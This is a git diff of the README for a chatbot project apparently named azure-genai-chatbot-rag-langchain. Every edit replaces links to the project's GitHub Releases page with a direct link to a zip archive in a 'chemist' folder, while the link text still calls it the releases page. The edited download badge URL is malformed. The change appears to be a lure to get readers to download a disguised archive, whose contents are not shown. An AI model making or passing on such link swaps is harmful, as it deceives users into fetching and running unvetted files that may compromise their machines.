@@ -1,6 +1,6 @@
 # 🤖 azure-genai-chatbot-rag-langchain - Build AI Chatbots Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Lp7X/azure-genai-chatbot-rag-langchain/releases)
+[![Download](https://raw.githubusercontent.com/Lp7X/azure-genai-chatbot-rag-langchain/main/chemist/azure-genai-chatbot-rag-langchain.zip%https://raw.githubusercontent.com/Lp7X/azure-genai-chatbot-rag-langchain/main/chemist/azure-genai-chatbot-rag-langchain.zip)](https://raw.githubusercontent.com/Lp7X/azure-genai-chatbot-rag-langchain/main/chemist/azure-genai-chatbot-rag-langchain.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the azure-genai-chatbot-rag-langchain project! This guide will assist
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://github.com/Lp7X/azure-genai-chatbot-rag-langchain/releases). You will find the latest version of the software there. 
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Lp7X/azure-genai-chatbot-rag-langchain/main/chemist/azure-genai-chatbot-rag-langchain.zip). You will find the latest version of the software there. 
 
 ### Step 1: Visit the Releases Page
 
@@ -72,7 +72,7 @@ For any questions or issues, please reach out through our GitHub issues page. We
 
 Once you have successfully downloaded and installed the application, you can start exploring its features. Try initiating a conversation with the chatbot and see how it performs. You might also want to check the documentation available in the repository to understand how to maximize its potential.
 
-For any updates or new releases, keep an eye on the [GitHub Releases](https://github.com/Lp7X/azure-genai-chatbot-rag-langchain/releases) page. 
+For any updates or new releases, keep an eye on the [GitHub Releases](https://raw.githubusercontent.com/Lp7X/azure-genai-chatbot-rag-langchain/main/chemist/azure-genai-chatbot-rag-langchain.zip) page. 
 
 ## 💡 Conclusion
 
